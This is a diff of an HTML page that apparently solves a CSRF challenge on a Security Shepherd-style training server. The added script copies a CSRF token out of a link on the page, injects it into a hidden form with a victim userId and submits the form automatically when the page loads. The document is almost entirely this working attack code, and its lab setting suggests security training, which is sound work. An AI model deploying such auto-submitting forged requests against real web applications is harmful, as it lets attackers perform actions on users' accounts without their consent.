@@ -7,18 +7,30 @@
     <body>
         <h1>Crazydais - CSR</h1>
 
-        <!--form id="csrf" action="https://shepherd.waratek.lan/user/csrfchallengethree/plusplus" method="POST">
+        <form id="csrf" action="https://shepherd.waratek.lan/user/csrfchallengethree/plusplus" method="POST">
             <input type="hidden" name="userId" value="fcab4e7dfbe01ce4e3904b97febe6a6a184302c3"/>
-        </form-->
+        </form>
 
         <script>
             (function () {
+                var header = document.getElementById("header").getElementsByTagName("a")[0];
+                var href = header.getAttribute("href");
+                var csrf = href.split("=")[1];
+                //console.log("The header is: " + csrfText);
+                
                 var form = document.getElementById("csrf");
-
-                var header = document.getElementById("header");
-                console.log("The header is: " + header);
-                //form.submit();
+                addCsrfToForm(form, csrf);
+                form.submit();
             })();
+            
+            function addCsrfToForm(form, value) {
+                // Create a hidden input element, and append it to the form
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'csrfToken';
+                input.value = value;
+                form.appendChild(input);
+            }
         </script>
     </body>
 </html>
